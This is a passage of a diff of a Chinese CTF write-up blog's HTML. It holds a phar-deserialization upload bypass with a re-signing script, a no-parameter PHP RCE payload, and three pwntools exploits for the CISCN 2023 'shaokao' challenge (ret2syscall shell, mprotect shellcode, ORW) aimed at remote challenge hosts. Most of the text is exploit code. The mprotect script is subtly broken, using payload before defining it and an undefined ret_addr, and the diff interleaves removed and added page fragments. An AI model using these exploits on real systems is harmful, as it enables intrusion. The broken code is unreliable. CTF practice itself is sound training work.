class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;上传异常&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$allowedExts</span> = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>, <span class="string">&quot;jpeg&quot;</span>, <span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;png&quot;</span>);</span><br><span class="line">    <span class="variable">$temp</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>, <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">    <span class="variable">$extension</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$temp</span>);</span><br><span class="line">    <span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$extension</span>, <span class="variable">$allowedExts</span>)))&#123;</span><br><span class="line">        <span class="variable">$content</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">        <span class="variable">$pos</span> = <span class="title function_ invoke__">strpos</span>(<span class="variable">$content</span>, <span class="string">&quot;__HALT_COMPILER();&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">gettype</span>(<span class="variable">$pos</span>)===<span class="string">&quot;integer&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;ltj一眼就发现了phar&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;./upload/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot; 文件已经存在&quot;</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;./upload/&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], <span class="string">&quot;w&quot;</span>);</span><br><span class="line">                <span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>, <span class="variable">$content</span>);</span><br><span class="line">                <span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;上传成功 ./upload/&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;dky不喜欢这个文件 .&quot;</span>.<span class="variable">$extension</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>对上传的文件进行了后缀名检测，并且对内容的__HALT_COMPILER()进行检测，虽然对 __HALT_COMPILER()进行了检测，但是完全可以对生成的phar文件进行zip加密，__HALT_COMPILER()应该会消失，绕过了文件上传的检测的同时phar依旧会对zip文件进行解压缩，然后file_get_contents()处可以利用phar伪协议触发反序列化，进行eval()的命令执行</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LoveNss</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ljt</span>=<span class="string">&quot;Misc&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dky</span>=<span class="string">&quot;Re&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>=<span class="string">&quot;system(&#x27;ls /&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">LoveNss</span>();</span><br><span class="line"> </span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>); <span class="comment">//自定义的meta-data</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算,默认是SHA1</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure>
- 
-<p>使用winhex修改phar.phar文件绕过_wakeup函数<br>这里修改了反序列的数量后，绕过了__wakeup()方法，但是修改之后，签名确保完整性就不对了，所以还要重新进行签名，默认是SHA-1算法，那么就用SHA-1算法吧。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&#x27;phar.phar&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line">data = file[:-<span class="number">28</span>]  <span class="comment"># 要签名的部分是文件头到metadata的数据。</span></span><br><span class="line"></span><br><span class="line">final = file[-<span class="number">8</span>:]</span><br><span class="line"></span><br><span class="line">newfile = data + sha1(data).digest() + final</span><br><span class="line"></span><br><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;newpoc.phar&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>).write(newfile)</span><br></pre></td></tr></table></figure>
- 
-<p>发现需要SHA256<br>这里显示要用SHA256加密进行签名，返回去将SHA1修改为SHA256，再进行gzip后，再进行相同的操作。</p>
-<h2 id="GXYCTF-2019-禁止套娃"><a href="#GXYCTF-2019-禁止套娃" class="headerlink" title="[GXYCTF 2019]禁止套娃"></a>[GXYCTF 2019]禁止套娃</h2><p>一开始什么都没有，dirsearch扫描看到有git用Githack得到</p>
- 
-<p>打开flag.php发现什么的没有，查看index.php<br>发现</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;还差一点哦！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;再好好想想！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;还想读flag，臭弟弟！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>首先是 php伪协议 data协议 filter协议 都不能使用了<br>如果如果’;’&#x3D;&#x3D;&#x3D;preg_replace(…)，那么就执行exp传递的命令<br>(?R)? : (?R)代表当前表达式，就是这个(&#x2F;[a-z,_]+((?R)?)&#x2F;)，所以会一直递归，?表示递归当前表达式0次或1次（若是(?R)*则表示递归当前表达式0次或多次，例如它可以匹配a(b(c()d()))）,就是无参数rce，简单说来就是：这串代码检查了我们通过GET方式传入的exp参数的值，如果传进去的值是传进去的值是字符串接一个()，那么字符串就会被替换为空。如果（递归）替换后的字符串只剩下;,那么我们传进去的 exp 就会被 eval 执行。比如我们传入一个 phpinfo();，它被替换后就只剩下;，那么根据判断条件就会执行phpinfo();。<br>常见绕过姿势<br>1、getallheaders()<br>2、get_defined_vars()<br>3、session_id()<br>详细见<a target="_blank" rel="noopener" href="https://blog.csdn.net/Manuffer/article/details/120738755">文章</a></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exp=highlight_file(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure>
-<p>解释函数：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">highlight_file() 函数对文件进行语法高亮显示，本函数是show_source() 的别名</span><br><span class="line">next() 输出数组中的当前元素和下一个元素的值。</span><br><span class="line">array_reverse() 函数以相反的元素顺序返回数组。(主要是能返回值)</span><br><span class="line">scandir() 函数返回指定目录中的文件和目录的数组。</span><br><span class="line">pos() 输出数组中的当前元素的值。</span><br><span class="line">localeconv() 函数返回一个包含本地数字及货币格式信息的数组，该数组的第一个元素就是<span class="string">&quot;.&quot;</span>。</span><br></pre></td></tr></table></figure>
-<p>loacleconv 函数会固定返回一个 . 然后pos将我们获得的 .返回到我们构造的 payload 使得 scandir能够返回当前目录下的数组（换句话说，就是读出当前目录下的文件） rray_reverse()以相反的顺序输出（目的是以正序输出查询出来的内容）然后 next 提取第二个元素（将.过滤出去），最后用highlight_file()给显示出来。</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
+      <span class="category-chain">
+        
+  <a href="/categories/pwn-wp/" class="category-chain-item">pwn_wp</a>
   
   
 
-      
+      </span>
+    
   
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2025/11/26/pwn-11/1/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2025/11/26/pwn-11/1/" class="post-title-link" itemprop="url">Untitled</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2025-11-26 20:12:08" itemprop="dateCreated datePublished" datetime="2025-11-26T20:12:08+08:00">2025-11-26</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2025-11-30 21:44:20" itemprop="dateModified" datetime="2025-11-30T21:44:20+08:00">2025-11-30</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p><img src="/image-7.png" alt="alt text"></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2025/11/26/pwn-11/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2025/11/26/pwn-11/" class="post-title-link" itemprop="url">pwn-11月</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2025-11-26 20:00:19" itemprop="dateCreated datePublished" datetime="2025-11-26T20:00:19+08:00">2025-11-26</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2025-11-30 22:11:58" itemprop="dateModified" datetime="2025-11-30T22:11:58+08:00">2025-11-30</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/pwn-wp/" itemprop="url" rel="index"><span itemprop="name">pwn_wp</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="CISCN-2023-初赛-烧烤摊儿"><a href="#CISCN-2023-初赛-烧烤摊儿" class="headerlink" title="[CISCN 2023 初赛]烧烤摊儿"></a>[CISCN 2023 初赛]烧烤摊儿</h2><img src="/2025/11/26/pwn-11/image-1.png" class="">
-<img src="/2025/11/26/pwn-11/image-2.png" class=""> 
-<img src="/2025/11/26/pwn-11/image.png" class="">
-
-<p>发现在gaming函数中存在将v5变量输入给全局name，并且没有对v5进行长度限制，有栈溢出<br>在.data里发现了name，可以考虑将&#x2F;bin&#x2F;sh写入.data段，因为是静态文件，其中没有libc和system，用ret2syscall构造execve(“&#x2F;bin&#x2F;sh”,NULL,NULL)get shell<br>确定程序中存在pop rax ；ret ，还要存在syscall</p>
-<p>首先需要通过 j_strcpy_ifunc(&amp;name, v5) 向 name 中写入 b’&#x2F;bin&#x2F;sh\x00’，并溢出 v5 构造 execve(“&#x2F;bin&#x2F;sh”, NULL, NULL) 执行</p>
-<p>注意这里是将 b’&#x2F;bin&#x2F;sh\x00’ 写入到 name，所以只能一次性 get shell</p>
-<p>如果分两次的话，例如：第一次写入 b’&#x2F;bin&#x2F;sh\x00’，第二次执行 execve(“&#x2F;bin&#x2F;sh”, NULL, NULL)，则在第二次中执行 j_strcpy_ifunc(&amp;name, v5) 又会将 name 覆盖掉，导致 get shell 失败</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)  <span class="comment"># 打印调试信息</span></span><br><span class="line">content = <span class="number">0</span> <span class="comment"># 本地Pwn通之后，将content改成0，Pwn远程端口</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> content == <span class="number">1</span>:</span><br><span class="line">    io = process(<span class="string">&quot;./shaokao&quot;</span>)  <span class="comment"># 程序路径</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;39.107.137.13&quot;</span>, <span class="number">20341</span>)  <span class="comment"># 题目的远程端口</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./shaokao&quot;</span>)</span><br><span class="line"></span><br><span class="line">name_addr = <span class="number">0x4E60F0</span></span><br><span class="line">pop_rdi_addr = <span class="number">0x40264f</span></span><br><span class="line">pop_rsi_addr = <span class="number">0x40a67e</span></span><br><span class="line">pop_rdx_rbx_addr = <span class="number">0x4a404b</span></span><br><span class="line">pop_rax_addr = <span class="number">0x458827</span></span><br><span class="line">syscall_addr = <span class="number">0x402404</span></span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;-100000000&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;5&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">0x28</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload += p64(pop_rax_addr) + p64(<span class="number">0x3b</span>)</span><br><span class="line">payload += p64(pop_rdi_addr) + p64(name_addr)</span><br><span class="line">payload += p64(pop_rsi_addr) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdx_rbx_addr) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(syscall_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>法二：用mprotect</p>
-<img src="/2025/11/26/pwn-11/image-3.png" class=""> 
-<p>name在0x4E60F0<br>用vmmap查看发现0x4e6000-0x4e9000没有执行权限,先利用栈溢出执行mprotect函数，将其权限设为0x7，然后返回main函数，将shellcode写入name</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)  <span class="comment"># 打印调试信息</span></span><br><span class="line">content = <span class="number">0</span> <span class="comment"># 本地Pwn通之后，将content改成0，Pwn远程端口</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> content == <span class="number">1</span>:</span><br><span class="line">    io = process(<span class="string">&quot;./shaokao&quot;</span>)  <span class="comment"># 程序路径</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="number">28438</span>)  <span class="comment"># 题目的远程端口</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./shaokao&quot;</span>)</span><br><span class="line"></span><br><span class="line">mprotect_addr = elf.symbols[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">make_addr=<span class="number">0x4e6000</span> <span class="comment">#页面对齐地址</span></span><br><span class="line">size=<span class="number">0x3000</span></span><br><span class="line">name_addr = <span class="number">0x4E60F0</span></span><br><span class="line">pop_rdi_addr = <span class="number">0x40264f</span><span class="comment">#修改内存页首地址</span></span><br><span class="line">pop_rsi_addr = <span class="number">0x40a67e</span><span class="comment">#修改内存页大小</span></span><br><span class="line">pop_rdx_rbx_addr = <span class="number">0x4a404b</span><span class="comment">#修改权限</span></span><br><span class="line"><span class="comment">#pop_rax_addr = 0x458827</span></span><br><span class="line"><span class="comment">#syscall_addr = 0x402404</span></span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;-100000000&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;5&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi_addr) + p64(<span class="number">0x4E6000</span>) + p64(pop_rsi_addr) + p64(<span class="number">0x3000</span>) + p64(pop_rdx_rbx_addr) + p64(<span class="number">0x7</span>) + p64(<span class="number">0</span>)  <span class="comment"># 布置mprotect()函数的参数</span></span><br><span class="line">payload += p64(mprotect_addr) + p64(ret_addr) + p64(main_addr)  <span class="comment"># 跳转到mprotect()函数后返回到main()数</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;-100000000&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;5&quot;</span>)</span><br><span class="line">shellcode = <span class="string">b&#x27;\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05&#x27;</span></span><br><span class="line">payload = shellcode.ljust(<span class="number">0x28</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload+=p64(name_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>法三：ORW<br>使用open，read，write函数组合 </p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)  <span class="comment"># 打印调试信息</span></span><br><span class="line">content = <span class="number">0</span> <span class="comment"># 本地Pwn通之后，将content改成0，Pwn远程端口</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> content == <span class="number">1</span>:</span><br><span class="line">    io = process(<span class="string">&quot;./shaokao&quot;</span>)  <span class="comment"># 程序路径</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="number">28438</span>)  <span class="comment"># 题目的远程端口</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./shaokao&quot;</span>)</span><br><span class="line"></span><br><span class="line">mprotect_addr = elf.symbols[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">make_addr=<span class="number">0x4e6000</span> <span class="comment">#页面对齐地址</span></span><br><span class="line">size=<span class="number">0x3000</span></span><br><span class="line">name_addr = <span class="number">0x4E60F0</span></span><br><span class="line">pop_rdi_addr = <span class="number">0x40264f</span><span class="comment">#修改内存页首地址</span></span><br><span class="line">pop_rsi_addr = <span class="number">0x40a67e</span><span class="comment">#修改内存页大小</span></span><br><span class="line">pop_rdx_rbx_addr = <span class="number">0x4a404b</span><span class="comment">#修改权限</span></span><br><span class="line"><span class="comment">#pop_rax_addr = 0x458827</span></span><br><span class="line"><span class="comment">#syscall_addr = 0x402404</span></span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">open_addr = elf.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_addr = elf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_addr = elf.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;-100000000&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;5&quot;</span>)</span><br><span class="line"></span><br><span class="line">ORW=p64(pop_rdi_addr)+p64(name_addr)+p64(pop_rsi_addr)+p64(<span class="number">0</span>)+p64(pop_rdx_rbx_addr)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(open_addr)</span><br><span class="line">ORW+=p64(pop_rdi_addr)+p64(<span 